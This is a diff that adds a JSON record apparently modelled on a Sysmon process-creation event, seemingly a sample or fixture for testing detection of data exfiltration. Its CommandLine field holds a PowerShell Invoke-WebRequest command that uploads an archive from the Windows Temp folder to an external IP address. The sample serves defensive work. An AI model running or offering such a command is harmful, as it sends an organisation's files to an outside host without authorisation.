@@ -1,0 +1,13 @@
+{
+  "_comment": "PowerShell POSTing a file body to an external endpoint",
+  "EventID": 1,
+  "UtcTime": "2026-08-11 10:00:00.000",
+  "Image": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
+  "CommandLine": "powershell.exe -nop -c Invoke-WebRequest -Uri https://45.61.13.7/u -Method Post -InFile C:\\Windows\\Temp\\out.7z",
+  "ParentImage": "C:\\Windows\\System32\\cmd.exe",
+  "ParentCommandLine": "cmd.exe /c",
+  "CurrentDirectory": "C:\\Windows\\Temp\\",
+  "User": "CORP\\a.patel",
+  "ProcessId": 9644,
+  "IntegrityLevel": "Medium"
+}
